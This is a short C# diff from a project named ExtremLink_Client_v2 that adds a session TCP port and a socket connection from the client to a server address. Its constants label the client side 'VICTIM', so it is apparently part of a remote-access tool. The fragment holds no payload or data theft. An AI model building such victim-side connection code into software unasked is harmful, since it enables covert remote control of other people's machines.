@@ -31,6 +31,7 @@ namespace ExtremLink_Client_v2.Classes
         // Integer constants which represent the sockets' ports:
         public readonly int VICTIM_TCP_PORT = 1847;
         public readonly int VICTIM_UDP_PORT = 1848;
+        public readonly int VICTIM_SESSION_TCP_PORT = 1849;
 
         // Import GetSystemMetrics from user32.dll
         [DllImport("user32.dll")]
@@ -76,6 +77,7 @@ namespace ExtremLink_Client_v2.Classes
             this.serverIpAddr = serverIpAddr;
             this.tcpSocket.Connect(new IPEndPoint(IPAddress.Parse(this.serverIpAddr), this.VICTIM_TCP_PORT));
             this.serverUdpEndPoint = new IPEndPoint(IPAddress.Parse(this.serverIpAddr), this.VICTIM_UDP_PORT);
+            this.sessionTcpSocket.Connect(new IPEndPoint(IPAddress.Parse(this.serverIpAddr), this.VICTIM_SESSION_TCP_PORT));
         }
         public void Start()
         {
@@ -162,7 +164,6 @@ namespace ExtremLink_Client_v2.Classes
             int receivedBytes = this.udpSocket.ReceiveFrom(buffer, ref remoteEndPoint);
             return this.OrderMessage(Encoding.UTF8.GetString(buffer, 0, receivedBytes));
         }
-
 
 
         // Sockets handlers:
